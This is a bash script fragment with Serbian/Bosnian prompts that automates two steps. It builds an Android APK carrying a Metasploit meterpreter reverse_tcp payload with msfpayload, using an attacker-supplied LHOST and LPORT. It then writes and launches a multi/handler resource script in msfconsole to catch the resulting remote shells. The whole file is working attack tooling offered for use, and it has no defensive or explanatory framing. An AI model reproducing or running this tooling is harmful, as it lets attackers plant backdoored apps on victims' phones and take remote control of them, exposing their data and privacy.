echo
function andro1() {
echo "==================================="
echo "Podesavanje Server aplikacije *.apk"
echo "===================================" 
echo
echo "Upisi IP adresu. (LHOST)."
read androip
echo "Upisi Port. (LPORT)."
read androport
echo "Upisi putanju i ime fajla, gdje ce bit sacuvano. (/root/Desktop/ime.apk)."
read androputanja
msfpayload android/meterpreter/reverse_tcp lhost=$androip lport=$androport R > $androputanja
}
echo
function andro2() {
echo
echo "===================="
echo "Podesavanje klijenta"
echo "===================="
echo
echo "[1] Zelim da koristim postojeci multi-handler."
echo "[2] Zelim da napravim novi multi-handler."
echo "[x] Izlaz"
read mho
     if [ $mho = "1" ] ; then
        if find ./sys/conf/metasploit -maxdepth 0 -empty | read v; then 
                 echo "[i] Skripte ne postoje..." ; 
                 echo "[i] Napravi novu skriptu." ;
                 echo "[i] Upisi ime skripte (ime.rc)" ;
                 read imes 
                 echo use exploit/multi/handler >> ./sys/conf/metasploit/$imes ;
                 echo set PAYLOAD android/meterpreter/reverse_tcp >> ./sys/conf/metasploit/$imes ;
                 echo "Upisi IP LHOST" ;
                 read mho1lhost ; 
                 echo set LHOST $mho1lhost >> ./sys/conf/metasploit/$imes ;
                 echo "Upisi LPORT" ;
                 read mho1lport ;
                 echo set LPORT $mho1lport >> ./sys/conf/metasploit/$imes ;
                 echo exploit >> ./sys/conf/metasploit/$imes ;
                 cat ./sys/conf/metasploit/$imes ;
                 msfconsole -r ./sys/conf/metasploit/$imes ;
             else
                echo "koju skriptu zelis da koristis"
                ls -l ./sys/conf/metasploit/
                read imes3
                cat ./sys/conf/metasploit/$imes3
                msfconsole -r ./sys/conf/metasploit/$imes3
              fi
             fi
    if [ $mho = "2" ] ; then
                 echo "[i] Upisi ime skripte (ime.rc)" ;
                 read imes 
                 echo use exploit/multi/handler >> ./sys/conf/metasploit/$imes ;
                 echo set PAYLOAD android/meterpreter/reverse_tcp >> ./sys/conf/metasploit/$imes ;
                 echo "Upisi IP LHOST" ;
                 read mho1lhost ; 
                 echo set LHOST $mho1lhost >> ./sys/conf/metasploit/$imes ;
                 echo "Upisi LPORT" ;
                 read mho1lport ;
                 echo set LPORT $mho1lport >> ./sys/conf/metasploit/$imes ;
                 echo exploit >> ./sys/conf/metasploit/$imes ;
                 cat ./sys/conf/metasploit/$imes ;
                 msfconsole -r ./sys/conf/metasploit/$imes ;
               fi
     if [ $mho = "x" ] ; then
        exit
     fi
}



